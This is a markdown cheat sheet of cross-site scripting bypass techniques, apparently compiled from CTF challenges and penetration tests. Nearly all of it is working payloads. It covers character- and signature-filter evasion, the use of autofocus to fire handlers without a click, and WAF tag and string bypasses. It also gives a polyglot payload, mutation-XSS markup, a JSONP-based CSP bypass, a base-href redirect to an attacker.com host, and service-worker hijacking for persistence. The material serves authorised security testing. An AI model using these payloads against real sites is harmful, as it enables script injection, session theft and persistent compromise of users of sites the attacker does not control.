# XSS Filter Bypass Techniques

Collected from CTF challenges and real-world engagements.

## Verification Pitfalls

### img src=x Does NOT Always Trigger onerror

When verifying XSS in headless/automated contexts, `<img src=x onerror=alert(1)>` is the go-to payload. However, browsers resolve `src=x` as a relative URL (`https://target.com/x`). If the target returns ANY response for unknown paths (WordPress 404 pages, SPA catch-alls, nginx default pages), the image may "load" successfully (naturalWidth > 0) and `onerror` never fires.

**Always use an absolute URL guaranteed to fail:**
```html
<img src=https://invalid.invalid/x.png onerror=alert(document.domain)>
```

**In headless verification (Playwright/Puppeteer/browser tools):**
- Override `window.alert` before triggering: `window._xss = []; window.alert = m => window._xss.push(m);`
- Check `window._xss` array after triggering — headless browsers suppress dialog boxes
- Don't rely on DOM element count alone — verify the handler actually executed

## Character-Restricted XSS (No Parentheses, Quotes, Dots, Semicolons)

When WAF/filter blocks `( ) . , ; ' "` but allows `< > / = ! - _ @ # $ % ^ & * + ~ ` | \ { } [ ] : ?`:

### Tagged Template Literals (bypass parentheses)
```
alert`1`          // equivalent to alert(['1'])
confirm`xss`      // works with any function accepting args
prompt`1`
```

### HTML Entities (bypass keyword signature detection)
When "alert" is blocked as a signature but `&` and `#` are allowed:
```
&#x61lert`1`      // &#x61 = 'a' (hex entity without semicolon)
&#97lert`1`       // &#97 = 'a' (decimal entity without semicolon)
&#x0061lert`1`    // longer hex form
```
Note: HTML entities decode in attribute values when set via innerHTML. The HTML5 parser terminates numeric refs at non-hex chars even without semicolons.

### Unicode Escapes (bypass keyword detection — JS context only)
```
\u0061lert`1`     // works in JS context, NOT in innerHTML attribute values
```
⚠️ Pitfall: If the server double-escapes backslashes (stores `\\u0061`), the unicode escape becomes a literal string. Use HTML entities instead.

### Auto-firing Event Handlers (zero-click)
When `onload`, `onerror`, `src=`, `<script>`, `<img>`, `<iframe>`, `<embed>` are signature-blocked:

| Element | Event | Auto-fires? | Notes |
|---------|-------|-------------|-------|
| `<input autofocus onfocus=X>` | onfocus | ✅ YES | Best zero-click vector |
| `<details open ontoggle=X>` | ontoggle | ❌ NO via innerHTML | Only fires on state CHANGE, not insertion |
| `<marquee onstart=X>` | onstart | ❌ Unreliable | Deprecated, inconsistent in modern Chrome |
| `<div onmouseover=X>` | onmouseover | ❌ Needs hover | 1-click acceptable per some programs |
| `<select onfocus=X autofocus>` | onfocus | ✅ YES | Alternative to input |
| `<textarea onfocus=X autofocus>` | onfocus | ✅ YES | Alternative to input |

### Winning Payload Pattern
```html
<input onfocus=&#x61lert`1` autofocus>
```
Bypasses:
- Character filter: no `( ) . , ; ' "`
- Signature filter: no literal "alert" string
- Zero-click: autofocus triggers onfocus on insertion

## Identifying Filter Types

Two distinct filter layers to probe separately:
1. **Character filter**: blocks specific chars regardless of context
   - Test: send each char individually in an otherwise-clean string
2. **Signature filter**: blocks known attack patterns/keywords
   - Test: use allowed chars to form tag+event combos, vary the handler value

Probe methodology:
```
Step 1: Map allowed characters (send "testXtest" for each char X)
Step 2: Map allowed elements (<svg>, <input>, <form>, <details>, etc.)
Step 3: Map allowed event handlers (onmouseover, onfocus, ontoggle, onstart)
Step 4: Map blocked keywords in handler values (alert, prompt, confirm, eval)
Step 5: Combine: allowed element + allowed event + encoded keyword + no-paren call
```

## DOMPurify Bypass Considerations

- DOMPurify sanitizes content but if user-controlled data is rendered via `innerHTML` WITHOUT DOMPurify (like `user_name` vs `content` fields), that's the vector
- Always check: which fields go through sanitization and which don't
- DOM clobbering via `id=` attributes can override `window.X` properties if DOMPurify allows `id`

---

## Context-Specific Payloads

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details ontoggle=alert(1)>
<script x>alert(1)</script>
```

### Attribute Context
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='
```

### JavaScript Context
```javascript
';alert(1);//
\";alert(1);//
${alert(1)}
```

### URL Context
```
javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## WAF Bypass Techniques

### Tag Filter Bypass
```html
<scrscriptipt>alert(1)</scrscriptipt>
<scr<script>ipt>alert(1)</script>
<svg><animate onbegin=alert(1) attributeName=x>
<a href="j&Tab;a&Tab;v&Tab;asc&Tab;r&Tab;ipt:alert&lpar;1&rpar;">Click</a>
```

### String Filter Bypass (alert blocked)
```javascript
eval(atob('YWxlcnQoMSk='))
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
top['al'+'ert'](1)
window['alert'](1)
self['alert'](1)
```

### Encoding Tricks
```html
&#x61lert(1)          // HTML hex entity
&#97lert(1)           // HTML decimal entity
\u0061lert(1)         // JS unicode (JS context only)
```

---

## CSP Bypass Techniques

### JSONP Endpoint Abuse
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

### Unsafe Directives
```
script-src 'unsafe-inline' 'unsafe-eval' data:
```

### CSP Injection (policy reflected from input)
```
script-src 'self' trusted.com; script-src-elem 'unsafe-inline'
```

### base-uri Missing
```html
<base href="https://attacker.com/">
<!-- All relative script srcs now load from attacker -->
```

---

## DOM-Based XSS

### Sources
```
document.location, document.URL, document.referrer
window.location.href, window.location.hash
window.name, document.cookie
postMessage data, localStorage/sessionStorage
```

### Sinks
```
document.write(), innerHTML, outerHTML
insertAdjacentHTML(), eval()
setTimeout()/setInterval()
Function(), location.href=
jQuery.html(), $.append(), v-html, dangerouslySetInnerHTML
```

---

## Mutation XSS (mXSS)

Parser-based injection using valid HTML that mutates during DOM serialization:
```html
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```
Bypasses sanitizers that check pre-parse but browser re-parses differently.

---

## Polyglot XSS

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Service Worker Hijacking (Persistent XSS)

```javascript
navigator.serviceWorker.register("/evil-sw.js");
// evil-sw.js intercepts ALL network requests — persistent until unregistered
```

---

## Framework-Specific Sinks

| Framework | Dangerous Pattern |
|-----------|-------------------|
| React | `dangerouslySetInnerHTML={{__html: userInput}}` |
| Vue | `v-html="userInput"` |
| Angular | `[innerHTML]="userInput"`, `bypassSecurityTrustHtml()` |
| jQuery | `.html(userInput)`, `.append(userInput)` |
| EJS | `<%- userInput %>` (unescaped) |
